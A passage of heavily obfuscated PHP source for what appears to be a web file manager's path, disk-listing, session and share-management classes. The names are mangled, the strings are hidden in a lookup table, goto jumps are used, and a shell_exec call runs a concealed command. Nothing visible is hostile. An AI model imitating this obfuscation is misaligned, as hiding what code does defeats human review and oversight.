(!$…ÌÎşÃŠ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($…ÌÎşÃŠ)); } public static function makeShare($³ÈíÅé, $ó“Î“ä¡) { return self::makePath(self::KOD_SHARE_ITEM, $³ÈíÅé, $ó“Î“ä¡); } public static function makeFileTypePath($ããÊÀÙÖ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ããÊÀÙÖ); } public static function makeFileTagPath($÷Ç¬şÏö) { return self::makePath(self::KOD_USER_FILE_TAG, $÷Ç¬şÏö); } public static function makePath($ú‹ÍÏÍŒ, $Ùõª©ĞŒ = '', $ç×ê‰ÃÂ = '') { $ªóÜ‘˜Ğ =& $_SERVER[Š—Â“œÔ]; $¾´Üè¶Ö = substr($ú‹ÍÏÍŒ, 1, -1); $¡ñ¼¥Ôî = $ªóÜ‘˜Ğ[1365] . $¾´Üè¶Ö . $ªóÜ‘˜Ğ[1366] . $Ùõª©ĞŒ . $ªóÜ‘˜Ğ[1367]; $¡ñ¼¥Ôî = $ç×ê‰ÃÂ ? $¡ñ¼¥Ôî . $ç×ê‰ÃÂ . $ªóÜ‘˜Ğ[8] : $¡ñ¼¥Ôî; return $¡ñ¼¥Ôî; } public static function hashPath($£§óŠªÉ, $×ê×Ñï® = true) { $š¢ŸÁ²Ó =& $_SERVER[Š—Â“œÔ]; $‘‡æ›æ© = is_array($£§óŠªÉ) ? $£§óŠªÉ : IO::info($£§óŠªÉ); $ç³íò®Ö = _get($‘‡æ›æ©, $š¢ŸÁ²Ó[1368], $š¢ŸÁ²Ó[12]); if (!$ç³íò®Ö && isset($‘‡æ›æ©[$š¢ŸÁ²Ó[237]])) { $ç³íò®Ö = trim($‘‡æ›æ©[$š¢ŸÁ²Ó[237]], $š¢ŸÁ²Ó[121]); } if (!$ç³íò®Ö && isset($‘‡æ›æ©[$š¢ŸÁ²Ó[193]]) && $‘‡æ›æ©[$š¢ŸÁ²Ó[193]]) { $‘‡æ›æ© = IO::info(KodIO::make($‘‡æ›æ©[$š¢ŸÁ²Ó[193]])); $ç³íò®Ö = _get($‘‡æ›æ©, $š¢ŸÁ²Ó[1368], $š¢ŸÁ²Ó[12]); } $µ‚›â = md5($‘‡æ›æ©[$š¢ŸÁ²Ó[87]] . $‘‡æ›æ©[$š¢ŸÁ²Ó[79]] . $‘‡æ›æ©[$š¢ŸÁ²Ó[88]]); if (!$ç³íò®Ö && file_exists($‘‡æ›æ©[$š¢ŸÁ²Ó[87]])) { $ç³íò®Ö = Cache::get($µ‚›â . $š¢ŸÁ²Ó[1369]); $ç³íò®Ö = !1; if (!$ç³íò®Ö) { $ç³íò®Ö = IO::hashSimple($‘‡æ›æ©[$š¢ŸÁ²Ó[87]]); Cache::set($µ‚›â . $š¢ŸÁ²Ó[1369], $ç³íò®Ö, 3600 * 24 * 30); } } if ($×ê×Ñï® && !$ç³íò®Ö) { } return $ç³íò®Ö ? $ç³íò®Ö : $µ‚›â; } public static function hashPathSafe($äåªñïê, $¾­®üëÃ = true) { $¸ÀÄ·Ò´ =& $_SERVER[Š—Â“œÔ]; $‘µñ÷òé = self::hashPath($äåªñïê, $¾­®üëÃ); return md5($‘µñ÷òé . $¸ÀÄ·Ò´[1370] . Model($¸ÀÄ·Ò´[837])->get($¸ÀÄ·Ò´[838])); } public static function initSystemPath() { $ÍëùÃø‘ =& $_SERVER[Š—Â“œÔ]; if (defined($ÍëùÃø‘[1371])) { return; } define($ÍëùÃø‘[1371], self::systemPath($ÍëùÃø‘[191])); define($ÍëùÃø‘[1372], self::systemPath($ÍëùÃø‘[1373])); define($ÍëùÃø‘[1374], self::systemPath($ÍëùÃø‘[1375])); define($ÍëùÃø‘[1376], self::systemPath($ÍëùÃø‘[1377])); IOHistory::bindEvent(); } public static function systemPath($½ÕûÑ) { $Ç–³§Ò =& $_SERVER[Š—Â“œÔ]; $¦¿­Íõ = $Ç–³§Ò[1378] . ucfirst($½ÕûÑ); $éÁ‰¤Ö = Model($Ç–³§Ò[837])->get($¦¿­Íõ); if ($éÁ‰¤Ö) { return $éÁ‰¤Ö; } if ($½ÕûÑ == $Ç–³§Ò[191]) { $éÁ‰¤Ö = self::make(Model($Ç–³§Ò[892])->systemRootPathAdd($Ç–³§Ò[610])); } else { $éÁ‰¤Ö = self::systemPath($Ç–³§Ò[191]); $èÏ›êäÔ = self::sourceID($éÁ‰¤Ö); $éÁ‰¤Ö = self::make(Model($Ç–³§Ò[892])->mkdir($èÏ›êäÔ, $½ÕûÑ)); } Model($Ç–³§Ò[837])->set($¦¿­Íõ, $éÁ‰¤Ö); return $éÁ‰¤Ö; } public static function systemFolder($Ş×ß­¯æ) { $×óÖÄ­£ = IO_PATH_SYSTEM_SOURCE . $Ş×ß­¯æ; $óºÌ¤êú = Cache::get($×óÖÄ­£); if (!$óºÌ¤êú) { $Ìºè¨ŞÌ = IO::infoFullSimple($×óÖÄ­£); if (!$Ìºè¨ŞÌ) { $óºÌ¤êú = IO::mkdir($×óÖÄ­£, REPEAT_SKIP); } else { $óºÌ¤êú = $Ìºè¨ŞÌ[$_SERVER[Š—Â“œÔ][87]]; } Cache::set($×óÖÄ­£, $óºÌ¤êú, 3600 * 10); } return $óºÌ¤êú; } public static function defaultDriver() { return Model($_SERVER[Š—Â“œÔ][834])->defaultDriver(); } public static function defaultIO() { $•ºÉâØö =& $_SERVER[Š—Â“œÔ]; $Î¥˜®Úş = self::defaultDriver(); return $•ºÉâØö[1379] . $Î¥˜®Úş[$•ºÉâØö[477]] . $•ºÉâØö[1367]; } public static function defaultDriverInit() { static $ÌÙµºß = false; if ($ÌÙµºß) { return $ÌÙµºß; } $ÌÙµºß = IO::init(self::defaultIO()); return $ÌÙµºß; } public static function fileTypeList() { $²³Úì›¯ =& $_SERVER[Š—Â“œÔ]; $åÉ²À®Ø = $GLOBALS[$²³Úì›¯[6]][$²³Úì›¯[1380]]; foreach ($åÉ²À®Ø as $¤ğ¨€ªû => $ãËæïÄº) { $´‘Î•Èº = $²³Úì›¯[1381] . $¤ğ¨€ªû; $ş¶¡‡‚ş = LNG($´‘Î•Èº); if ($´‘Î•Èº != $ş¶¡‡‚ş) { $åÉ²À®Ø[$¤ğ¨€ªû][$²³Úì›¯[32]] = $ş¶¡‡‚ş; } } return $åÉ²À®Ø; } public static function diskList($ãÈÈ•… = true) { $…İ‹¾¹§ = $_SERVER[Š—Â“œÔ][1382]; if ($ãÈÈ•…) { $ËÑÍ®Ğ = Cache::get($…İ‹¾¹§); if (is_array($ËÑÍ®Ğ)) { return $ËÑÍ®Ğ; } } $ËÑÍ®Ğ = self::diskListGet(); Cache::set($…İ‹¾¹§, $ËÑÍ®Ğ, 60); return $ËÑÍ®Ğ; } public static function diskListGet() { $»Ú‡¹§« =& $_SERVER[Š—Â“œÔ]; $²™á¿È‘ = array(); if ($GLOBALS[$»Ú‡¹§«[6]][$»Ú‡¹§«[1383]] == $»Ú‡¹§«[1384]) { $óáÁƒ° = $»Ú‡¹§«[1385]; for ($ĞÒ—šŞ = 0; $ĞÒ—šŞ < strlen($óáÁƒ°); $ĞÒ—šŞ++) { $î÷“ì™® = $óáÁƒ°[$ĞÒ—šŞ] . $»Ú‡¹§«[1386]; if (file_exists($î÷“ì™®)) { $²™á¿È‘[] = $î÷“ì™®; } } return $²™á¿È‘; } if (!function_exists($»Ú‡¹§«[101])) { $²™á¿È‘[] = $»Ú‡¹§«[903]; return $²™á¿È‘; } $Éî ş = explode($»Ú‡¹§«[287], shell_exec($»Ú‡¹§«[1387])); array_shift($Éî ş); array_pop($Éî ş); $é¨ØÚ¬¹ = array($»Ú‡¹§«[1388], $»Ú‡¹§«[1389], $»Ú‡¹§«[1390], $»Ú‡¹§«[1391], $»Ú‡¹§«[1392], $»Ú‡¹§«[1393], $»Ú‡¹§«[1394], $»Ú‡¹§«[1395]); foreach ($Éî ş as $Ìä³ˆ¬) { $ö¦§°õ¯ = preg_split($»Ú‡¹§«[1396], $Ìä³ˆ¬); $î÷“ì™® = $ö¦§°õ¯[count($ö¦§°õ¯) - 1]; if (!strstr($ö¦§°õ¯[0], $»Ú‡¹§«[1397]) || !$î÷“ì™®) { continue; } $†Ã¤û“Û = rtrim($î÷“ì™®, $»Ú‡¹§«[8]) . $»Ú‡¹§«[8]; if (in_array($†Ã¤û“Û, $é¨ØÚ¬¹)) { continue; } $²™á¿È‘[] = $†Ã¤û“Û; } return $²™á¿È‘; } public static function isSameDisk($Î¹š´ÙÕ, $Â¹¤Üşì) { $Û–âË…¯ =& $_SERVER[Š—Â“œÔ]; if ($GLOBALS[$Û–âË…¯[6]][$Û–âË…¯[1383]] == $Û–âË…¯[1384]) { return strtolower(substr($Î¹š´ÙÕ, 0, 1)) == strtolower(substr($Â¹¤Üşì, 0, 1)); } $‡ášÏÛä = stat($Î¹š´ÙÕ); $Àè’¬£‹ = stat($Â¹¤Üşì); if ($‡ášÏÛä === !1 || $Àè’¬£‹ === !1) { return !1; } return $‡ášÏÛä[$Û–âË…¯[1398]] === $Àè’¬£‹[$Û–âË…¯[1398]]; $÷Ì÷®¶š = self::diskList(); $Û•õÁõÓ = !1; $­Ìúæ­— = !1; sort($÷Ì÷®¶š); $÷Ì÷®¶š = array_reverse($÷Ì÷®¶š); $Î¹š´ÙÕ = rtrim($Î¹š´ÙÕ, $Û–âË…¯[8]) . $Û–âË…¯[8]; $Â¹¤Üşì = rtrim($Â¹¤Üşì, $Û–âË…¯[8]) . $Û–âË…¯[8]; foreach ($÷Ì÷®¶š as $ÒÍ£ë¡•) { $²šÍì°¸ = strlen($ÒÍ£ë¡•); if (!$Û•õÁõÓ && substr($Î¹š´ÙÕ, 0, $²šÍì°¸) == $ÒÍ£ë¡•) { $Û•õÁõÓ = $ÒÍ£ë¡•; } if (!$­Ìúæ­— && substr($Â¹¤Üşì, 0, $²šÍì°¸) == $ÒÍ£ë¡•) { $­Ìúæ­— = $ÒÍ£ë¡•; } if ($Û•õÁõÓ && $­Ìúæ­—) { break; } } return $Û•õÁõÓ === $­Ìúæ­—; } public static function transferType($Û„¤“¡Ò, $ªæÏ†Û) { $‹ğƒœÇ· =& $_SERVER[Š—Â“œÔ]; $ûçà·»Í = self::driverType($Û„¤“¡Ò); $á‚ëĞ‚Î = self::driverType($ªæÏ†Û); if ($ûçà·»Í[$‹ğƒœÇ·[33]] == $á‚ëĞ‚Î[$‹ğƒœÇ·[33]] && $ûçà·»Í[$‹ğƒœÇ·[1399]] == $á‚ëĞ‚Î[$‹ğƒœÇ·[1399]]) { return $‹ğƒœÇ·[1400]; } if ($ûçà·»Í[$‹ğƒœÇ·[33]] == $‹ğƒœÇ·[937] && $á‚ëĞ‚Î[$‹ğƒœÇ·[33]] == $‹ğƒœÇ·[109]) { return $‹ğƒœÇ·[1276]; } if ($ûçà·»Í[$‹ğƒœÇ·[33]] == $‹ğƒœÇ·[109] && $á‚ëĞ‚Î[$‹ğƒœÇ·[33]] == $‹ğƒœÇ·[937]) { return $‹ğƒœÇ·[110]; } return $‹ğƒœÇ·[1401]; } public static function driverType($İ†©‹Íó) { $¶ËœÚ¢¯ =& $_SERVER[Š—Â“œÔ]; $« ¶È•Ô = str_replace($¶ËœÚ¢¯[1402], $¶ËœÚ¢¯[12], strtolower($İ†©‹Íó->getType())); if ($« ¶È•Ô == $¶ËœÚ¢¯[824] || $« ¶È•Ô == $¶ËœÚ¢¯[1403] || $« ¶È•Ô == $¶ËœÚ¢¯[1404]) { $İ†©‹Íó = self::defaultDriverInit(); } else { if ($« ¶È•Ô == $¶ËœÚ¢¯[1286] || $« ¶È•Ô == $¶ËœÚ¢¯[1405]) { $İ†©‹Íó = IO::init($İ†©‹Íó->pathParse[$¶ËœÚ¢¯[1229]]); } } $˜šö»Ô = $İ†©‹Íó->path; $« ¶È•Ô = str_replace($¶ËœÚ¢¯[1402], $¶ËœÚ¢¯[12], strtolower($İ†©‹Íó->getType())); if ($« ¶È•Ô == $¶ËœÚ¢¯[109]) { return array($¶ËœÚ¢¯[33] => $¶ËœÚ¢¯[109], $¶ËœÚ¢¯[1399] => $¶ËœÚ¢¯[12], $¶ËœÚ¢¯[87] => $˜šö»Ô, $¶ËœÚ¢¯[98] => $İ†©‹Íó); } return array($¶ËœÚ¢¯[33] => $¶ËœÚ¢¯[937], $¶ËœÚ¢¯[1399] => $İ†©‹Íó->pathDriver, $¶ËœÚ¢¯[87] => $˜šö»Ô, $¶ËœÚ¢¯[98] => $İ†©‹Íó); } public static function pathDriverType($ŒæåÏ¯) { return $ŒæåÏ¯ ? self::driverType(IO::init($ŒæåÏ¯)) : !1; } public static function pathDriverLocal($ÀíË¼œÚ) { $¤…şüßŞ =& $_SERVER[Š—Â“œÔ]; $æíàéÚ» = $ÀíË¼œÚ ? self::driverType(IO::init($ÀíË¼œÚ)) : !1; return strtolower($æíàéÚ»[$¤…şüßŞ[33]]) == $¤…şüßŞ[109] ? !0 : !1; } public static function allowCover($úì¿†üÜ, $ÓÍÂ»¯° = true) { $×Ö™Û†Ü =& $_SERVER[Š—Â“œÔ]; if (is_string($úì¿†üÜ)) { $úì¿†üÜ = IO::info($úì¿†üÜ); } if (!$úì¿†üÜ || $úì¿†üÜ[$×Ö™Û†Ü[33]] == $×Ö™Û†Ü[78] || $úì¿†üÜ[$×Ö™Û†Ü[79]] <= 100) { return !1; } if (isset($úì¿†üÜ[$×Ö™Û†Ü[1406]]) || !$úì¿†üÜ[$×Ö™Û†Ü[87]]) { return !1; } if (isset($úì¿†üÜ[$×Ö™Û†Ü[234]]) && !$úì¿†üÜ[$×Ö™Û†Ü[234]]) { return !1; } static $€¾»âÁŠ = false; if (!$€¾»âÁŠ || !$ÓÍÂ»¯°) { $äùÄ×åŞ = self::driverType(IO::init($úì¿†üÜ[$×Ö™Û†Ü[87]])); $ÌÌ¤ïîç = $äùÄ×åŞ[$×Ö™Û†Ü[98]]; $€¾»âÁŠ = $×Ö™Û†Ü[196]; if ($äùÄ×åŞ[$×Ö™Û†Ü[33]] == $×Ö™Û†Ü[109]) { $€¾»âÁŠ = $×Ö™Û†Ü[1407]; } if ($äùÄ×åŞ[$×Ö™Û†Ü[98]] && is_array($äùÄ×åŞ[$×Ö™Û†Ü[98]]->config)) { $ĞÙÍ‡ÄÂ = $äùÄ×åŞ[$×Ö™Û†Ü[98]]->config; if (isset($ĞÙÍ‡ÄÂ[$×Ö™Û†Ü[1408]]) && $ĞÙÍ‡ÄÂ[$×Ö™Û†Ü[1408]]) { $€¾»âÁŠ = $×Ö™Û†Ü[1407]; } } $ÓûÛ—¥À = KodIO::defaultDriver(); if (strtolower($ÓûÛ—¥À[$×Ö™Û†Ü[98]]) == $×Ö™Û†Ü[109] && is_array($ÓûÛ—¥À[$×Ö™Û†Ü[6]])) { $ğ¡Ç˜º = $ÓûÛ—¥À[$×Ö™Û†Ü[6]][$×Ö™Û†Ü[1259]]; if (substr($ğ¡Ç˜º, 0, 2) == $×Ö™Û†Ü[1409]) { $ğ¡Ç˜º = str_replace($×Ö™Û†Ü[1409], BASIC_PATH, $ğ¡Ç˜º); } $ğ¡Ç˜º = str_replace($×Ö™Û†Ü[256], $×Ö™Û†Ü[8], $ğ¡Ç˜º); if (substr($úì¿†üÜ[$×Ö™Û†Ü[87]], 0, strlen($ğ¡Ç˜º)) == $ğ¡Ç˜º) { $€¾»âÁŠ = $×Ö™Û†Ü[196]; } } } return $€¾»âÁŠ == $×Ö™Û†Ü[1407] ? !0 : !1; } } goto A»©ºËôø§; a‘“œôœˆ: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\137\x73\145\163\x73\151\x6f\x6e"; public function get($Ò‰ßõçÃ) { $—ÒŒëÃõ =& $_SERVER[Š—Â“œÔ]; $’“–¼Ñì = $this->where(array($—ÒŒëÃõ[2110] => $Ò‰ßõçÃ))->find(); if (!is_array($’“–¼Ñì)) { return !1; } return $’“–¼Ñì[$—ÒŒëÃõ[171]]; } public function set($¨Š«ÉûÏ, $¢Ë¥šà‚, $«ïŠ‡†¹ = 3600) { $ú¹´‹Œ =& $_SERVER[Š—Â“œÔ]; $“ÑÂ• = array($ú¹´‹Œ[2110] => $¨Š«ÉûÏ, $ú¹´‹Œ[2010] => $¢Ë¥šà‚, $ú¹´‹Œ[2111] => $«ïŠ‡†¹ + time()); if (Session::get($ú¹´‹Œ[2112])) { $“ÑÂ•[$ú¹´‹Œ[1770]] = Session::get($ú¹´‹Œ[2112]); } else { $“ÑÂ•[$ú¹´‹Œ[1770]] = 0; } if ($this->get($¨Š«ÉûÏ)) { return $this->where(array($ú¹´‹Œ[2110] => $¨Š«ÉûÏ))->save($“ÑÂ•); } else { return $this->add($“ÑÂ•, array(), !0); } } public function remove($íæÍ€ïº) { return $this->where(array($_SERVER[Š—Â“œÔ][2110] => $íæÍ€ïº))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Š—Â“œÔ][2113] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\124\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\x74\x2c\x75\160\144\x61\x74\x65", "\146\165\x6e\x63\164\151\157\x6e"), array("\x63\162\145\141\164\x65\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\x74\x69\157\x6e"), array("\157\160\164\x69\x6f\x6e\163", '', "\x69\x6e\x73\x65\x72\x74\x2c\x75\x70\x64\141\x74\x65\54\x73\145\154\145\143\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($³ˆæõà¯) { $Èí—š‹º =& $_SERVER[Š—Â“œÔ]; $×ø¬ã¶ = isset($³ˆæõà¯[0]) ? $³ˆæõà¯[0] : !1; $Ü¬Õ›ËÉ = $Èí—š‹º[2114] . USER_ID; return array($Èí—š‹º[2115] => array(USER_ID, $Èí—š‹º[2116], $Ü¬Õ›ËÉ), $Èí—š‹º[2055] => array($×ø¬ã¶, $Èí—š‹º[2117], $Ü¬Õ›ËÉ)); } protected function listSimple() { $¢¢âŒÁ = array($_SERVER[Š—Â“œÔ][1770] => USER_ID); $§ôƒß„ = $this->field($this->fieldList)->where($¢¢âŒÁ)->select(); return $§ôƒß„ ? $§ôƒß„ : array(); } protected function getInfo($óö¸ÙÏö, $œ¢šØ… = false, $ ‹µõõ‹ = '') { $öäÒ•Ğ™ =& $_SERVER[Š—Â“œÔ]; if ($œ¢šØ…) { return $this->_getShareInfo(array($öäÒ•Ğ™[670] => $óö¸ÙÏö)); } $½Ë‰öá = $this->cacheFunctionGet($öäÒ•Ğ™[2057], $óö¸ÙÏö, $ ‹µõõ‹); return $½Ë‰öá; } public function getInfoByHash($–Ö²ÈÂ) { return $this->_getShareInfo(array($_SERVER[Š—Â“œÔ][2118] => $–Ö²ÈÂ)); } public function getInfoByPath($­ê½¸Ş) { $àÖ©Ûşà =& $_SERVER[Š—Â“œÔ]; $ìÚ‰­ÃÜ = array($àÖ©Ûşà[1770] => USER_ID, $àÖ©Ûşà[193] => $­ê½¸Ş); return $this->_getShareInfo($ìÚ‰­ÃÜ); } public function getInfoBySourcePath($§Õæ½ïõ) { $Ó­†ù =& $_SERVER[Š—Â“œÔ]; $¸•Å²÷ = array($Ó­†ù[1770] => USER_ID, $Ó­†ù[1254] => $§Õæ½ïõ); return $this->_getShareInfo($¸•Å²÷); } private function _getShareInfo($Æèó”†ß) { $“àˆ‘¬Ú =& $_SERVER[Š—Â“œÔ]; $Ñ¸óêøñ = $this->where($Æèó”†ß)->find(); if (!$Ñ¸óêøñ) { return !1; } $Æèó”†ß = array($“àˆ‘¬Ú[670] => $Ñ¸óêøñ[$“àˆ‘¬Ú[670]]); $íòğ·ÛÉ = $“àˆ‘¬Ú[2119]; $Œ×ŞŞá = Model($“àˆ‘¬Ú[671])->order($“àˆ‘¬Ú[477])->field($íòğ·ÛÉ)->where($Æèó”†ß)->select(); if ($Ñ¸óêøñ[$“àˆ‘¬Ú[193]] == $“àˆ‘¬Ú[230]) { $Ñ¸óêøñ[$“àˆ‘¬Ú[90]] = IO::info($Ñ¸óêøñ[$“àˆ‘¬Ú[1254]]); } else { $Ñ¸óêøñ[$“àˆ‘¬Ú[90]] = Model($“àˆ‘¬Ú[1419])->pathInfo($Ñ¸óêøñ[$“àˆ‘¬Ú[193]]); } $Ñ¸óêøñ[$“àˆ‘¬Ú[2120]] = $Œ×ŞŞá; return $Ñ¸óêøñ; } protected function getInfoAuth($«À©ê˜Ä) { $Ø»ÆÃ¢¿ =& $_SERVER[Š—Â“œÔ]; $ô‹öÁŒä = $this->getInfo($«À©ê˜Ä); if ($ô‹öÁŒä[$Ø»ÆÃ¢¿[1770]] == USER_ID) { $ô‹öÁŒä[$Ø»ÆÃ¢¿[489]] = $ô‹öÁŒä[$Ø»ÆÃ¢¿[90]][$Ø»ÆÃ¢¿[489]]; } else { $ô‹öÁŒä[$Ø»ÆÃ¢¿[489]] = Model($Ø»ÆÃ¢¿[569])->authMake($ô‹öÁŒä[$Ø»ÆÃ¢¿[2120]]); } return $ô‹öÁŒä; } protected function listData($¿ãœÇü = null, $­†×ÄÜ€ = 300) { $¨ê”ÎÂî =& $_SERVER[Š—Â“œÔ]; $ø…ç†½ş = array(array($¨ê”ÎÂî[564] => array($¨ê”ÎÂî[1086], 0), $¨ê”ÎÂî[668] => array($¨ê”ÎÂî[1086], 0), $¨ê”ÎÂî[2121] => $¨ê”ÎÂî[2073])); if ($¿ãœÇü == $¨ê”ÎÂî[2122]) { $ø…ç†½ş = array($¨ê”ÎÂî[564] => 1); } else { if ($¿ãœÇü == $¨ê”ÎÂî[1239]) { $ø…ç†½ş = array($¨ê”ÎÂî[668] => 1); } } $ø…ç†½ş[$¨ê”ÎÂî[1770]] = USER_ID; $ŒŸ´õˆ = $this->where($ø…ç†½ş)->selectPage($­†×ÄÜ€); return $ŒŸ´õˆ; } protected function listToMe($àö³ÓÏË = 300) { $ÅÉşÊ®† =& $_SERVER[Š—Â“œÔ]; $´¼ı€ê² = Model($ÅÉşÊ®†[2123])->userGroupParents(USER_ID); $»Å¬–ó° = array($ÅÉşÊ®†[653] => SourceModel::TYPE_USER, $ÅÉşÊ®†[571] => USER_ID); if ($´¼ı€ê²) { $»Å¬–ó° = array(array($ÅÉşÊ®†[653] => SourceModel::TYPE_USER, $ÅÉşÊ®†[571] => USER_ID), array($ÅÉşÊ®†[653] => SourceModel::TYPE_GROUP, $ÅÉşÊ®†[571] => array($ÅÉşÊ®†[7], $´¼ı€ê²)), $ÅÉşÊ®†[2121] => $ÅÉşÊ®†[2073]); } $—êÕĞ¤ó = Model($ÅÉşÊ®†[671])->where($»Å¬–ó°)->selectPage($àö³ÓÏË); $¿Î¨‡äÀ = array_to_keyvalue_group($—êÕĞ¤ó[$ÅÉşÊ®†[447]], $ÅÉşÊ®†[670]); if (!$¿Î¨‡äÀ) { return $—êÕĞ¤ó; } $ûı“¸» = $ÅÉşÊ®†[2124]; $»Å¬–ó° = array($ÅÉşÊ®†[670] => array($ÅÉşÊ®†[494], array_keys($¿Î¨‡äÀ)), $ÅÉşÊ®†[1770] => array($ÅÉşÊ®†[1088], $ÅÉşÊ®†[230])); $âìŒíÌœ = $this->field($ûı“¸»)->where($»Å¬–ó°)->select(); foreach ($âìŒíÌœ as $ÉÁŸ¢Ì => &$»õŸ¤Ê) { $»õŸ¤Ê[$ÅÉşÊ®†[2120]] = $¿Î¨‡äÀ[$»õŸ¤Ê[$ÅÉşÊ®†[670]]]; } unset($»õŸ¤Ê); $ÈŞ—×Î = array($ÅÉşÊ®†[2125] => $âìŒíÌœ, $ÅÉşÊ®†[2126] => $—êÕĞ¤ó[$ÅÉşÊ®†[444]]); return $ÈŞ—×Î; } protected function shareAdd($îÃêè•Ç, $ÓâóÀîÀ) { $ø™ğÈ‹Ÿ =& $_SERVER[Š—Â“œÔ]; $ƒÌ§åÀÒ = $this->_addShareData($îÃêè•Ç, $ÓâóÀîÀ); if (!empty($ÓâóÀîÀ[$ø™ğÈ‹Ÿ[2127]])) { $this->_shareAuthSet($ƒÌ§åÀÒ, $ÓâóÀîÀ[$ø™ğÈ‹Ÿ[2127]]); } $this->shareEventAdd($îÃêè•Ç, $ÓâóÀîÀ, $ø™ğÈ‹Ÿ[2128]); return $ƒÌ§åÀÒ; } protected function shareAddSystem($œşş¤ÏÍ, $ÕæÕ™ ó) { $•œ²£ûé =& $_SERVER[Š—Â“œÔ]; $Ñ¦²ÔÕï = $this->_addShareData($œşş¤ÏÍ, $ÕæÕ™ ó, $•œ²£ûé[191]); $this->_shareAuthSet($Ñ¦²ÔÕï, $ÕæÕ™ ó[$•œ²£ûé[2127]]); return $Ñ¦²ÔÕï; } private function shareEventAdd($¹ÖÈ‚¯ç, $Ìß„ïêÄ, $±ëŸ²Ä† = "\141\144\144") { $¹–ûõ¢  =& $_SERVER[Š—Â“œÔ]; if (!$¹ÖÈ‚¯ç || $¹ÖÈ‚¯ç == $¹–ûõ¢ [230]) { return; } if ($±ëŸ²Ä† == $¹–ûõ¢ [2128]) { if ($Ìß„ïêÄ[$¹–ûõ¢ [564]] == $¹–ûõ¢ [91]) { Model($¹–ûõ¢ [638])->eventShare($¹ÖÈ‚¯ç, $¹–ûõ¢ [2129]); } if ($Ìß„ïêÄ[$¹–ûõ¢ [668]] == $¹–ûõ¢ [91]) { Model($¹–ûõ¢ [638])->eventShare($¹ÖÈ‚¯ç, $¹–ûõ¢ [2130]); } return; } $÷‰ğ¯î› = $this->getInfoByPath($¹ÖÈ‚¯ç); $×ŞÉÜ–Ë = $¹–ûõ¢ [2131]; if ($÷‰ğ¯î›[$¹–ûõ¢ [564]] == $¹–ûõ¢ [230] && $Ìß„ïêÄ[$¹–ûõ¢ [564]] == $¹–ûõ¢ [91]) { $×ŞÉÜ–Ë = $¹–ûõ¢ [2129]; } if ($÷‰ğ¯î›[$¹–ûõ¢ [564]] == $¹–ûõ¢ [91] && $Ìß„ïêÄ[$¹–ûõ¢ [564]] == $¹–ûõ¢ [230]) { $×ŞÉÜ–Ë = $¹–ûõ¢ [2132]; } if ($÷‰ğ¯î›[$¹–ûõ¢ [668]] == $¹–ûõ¢ [230] && $Ìß„ïêÄ[$¹–ûõ¢ [668]] == $¹–ûõ¢ [91]) { $×ŞÉÜ–Ë = $¹–ûõ¢ [2130]; } if ($÷‰ğ¯î›[$¹–ûõ¢ [668]] == $¹–ûõ¢ [91] && $Ìß„ïêÄ[$¹–ûõ¢ [668]] == $¹–ûõ¢ [230]) { $×ŞÉÜ–Ë = $¹–ûõ¢ [2133]; } Model($¹–ûõ¢ [638])->eventShare($¹ÖÈ‚¯ç, $×ŞÉÜ–Ë); return; } private function _addShareData($Ö…ûòÅ, $“£Ğ‰Üù = array(), $‘ ´á‘ = false) { $Ùó›ú„Ú =& $_SERVER[Š—Â“œÔ]; $Œ¶ñ‰ñù = $‘ ´á‘ == $Ùó›ú„Ú[191] ? 0 : USER_ID; $åÒ÷Â£ = array($Ùó›ú„Ú[493] => $Ö…ûòÅ, $Ùó›ú„Ú[1761] => $Œ¶ñ‰ñù); if ($Ö…ûòÅ == 0) { $åÒ÷Â£ = array($Ùó›ú„Ú[2134] => $“£Ğ‰Üù[$Ùó›ú„Ú[1254]], $Ùó›ú„Ú[1761] => $Œ¶ñ‰ñù); } if ($ƒÑîÛŒ± = $this->where($åÒ÷Â£)->find()) { return $ƒÑîÛŒ±[$Ùó›ú„Ú[670]]; } if ($Ö…ûòÅ == 0) { $Ëå¢‘§Ø = array($Ùó›ú„Ú[32] => get_path_this($“£Ğ‰Üù[$Ùó›ú„Ú[87]])); } else { $Ëå¢‘§Ø = Model($Ùó›ú„Ú[892])->sourceInfo($Ö…ûòÅ); if (!$Ëå¢‘§Ø) { return !1; } } if (!$“£Ğ‰Üù[$Ùó›ú„Ú[1658]]) { $“£Ğ‰Üù[$Ùó›ú„Ú[1658]] = $Ëå¢‘§Ø[$Ùó›ú„Ú[32]]; } $ÓôÊ‡ºÔ = array($Ùó›ú„Ú[1761] => $Œ¶ñ‰ñù, $Ùó›ú„Ú[493] => $Ö…ûòÅ, $Ùó›ú„Ú[1658] => $Ùó›ú„Ú[12], $Ùó›ú„Ú[564] => 0, $Ùó›ú„Ú[668] => 0, $Ùó›ú„Ú[1254] => $Ùó›ú„Ú[12], $Ùó›ú„Ú[384] => $Ùó›ú„Ú[12], $Ùó›ú„Ú[963] => $Ùó›ú„Ú[12], $Ùó›ú„Ú[2135] => 0, $Ùó›ú„Ú[2136] => 0, $Ùó›ú„Ú[828] => 0, $Ùó›ú„Ú[2137] => $Ùó›ú„Ú[12], $Ùó›ú„Ú[2118] => $Ùó›ú„Ú[12]); $úŸ—Û‰Ø = explode($Ùó›ú„Ú[50], $Ùó›ú„Ú[2138]); foreach ($úŸ—Û‰Ø as $ù²åùîç) { if (!isset($“£Ğ‰Üù[$ù²åùîç])) { continue; } $ÓôÊ‡ºÔ[$ù²åùîç] = $“£Ğ‰Üù[$ù²åùîç]; } $·äØŞ¿À = $this->add($ÓôÊ‡ºÔ); $îÌÍáºÛ = array($Ùó›ú„Ú[2118] => short_id($·äØŞ¿À)); $this->where(array($Ùó›ú„Ú[2139] => $·äØŞ¿À))->save($îÌÍáºÛ); return $·äØŞ¿À; } private function _shareAuthSet($Æ×ú¼œš, $«½¯¢‚ñ) { $ÜÙ²àâÛ =& $_SERVER[Š—Â“œÔ]; if (!is_array($«½¯¢‚ñ)) { return !1; } $ÃÎ›«Í„ = Model($ÜÙ²àâÛ[2083]); $ÃÎ›«Í„->where(array($ÜÙ²àâÛ[670] => $Æ×ú¼œš))->delete(); 